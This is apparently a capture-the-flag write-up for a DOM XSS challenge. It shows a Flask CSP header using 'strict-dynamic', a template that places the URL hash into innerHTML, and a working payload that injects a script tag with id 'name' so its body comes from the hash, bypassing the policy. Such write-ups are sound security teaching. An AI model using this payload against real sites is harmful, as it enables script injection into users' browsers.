# DOM XSS
This challenge involves DOM XSS
```python
response.headers['Content-Security-Policy'] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}' 'strict-dynamic'"
```
`vuln.html`:
```html
{% block content %}

  <script nonce={{ nonce }}>
    window.addEventListener("load", function() {
      var name_elem = document.getElementById("name");
      name_elem.innerHTML = `${location.hash.slice(1)} is my name !`;
    });
 </script>
  {{ param | safe }}
  <pre id="name"></pre>
{% endblock %}
```

There are 2 problem when trying to xss on /vuln:
- If payload is injected using url hash, it will be encoded:
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/7a1c01ca81bda9d5db1a70ee5632308519166a33d17202e764e10c8f85887806.png)
- CSP header prevent us from injecting script tag with the param

## Solve
Let's leverage the `strict-dynamic` policy of `script-src` and use the load hash script to set our own script: 
- `//` to comment out the later part of hash loader
```
/vuln?param=<script id="name"></script>#alert(1);//
```
This creates our own script tag with id=name, the hash loader will change the innerHTML of our script, lending us the permission to execute javascript.
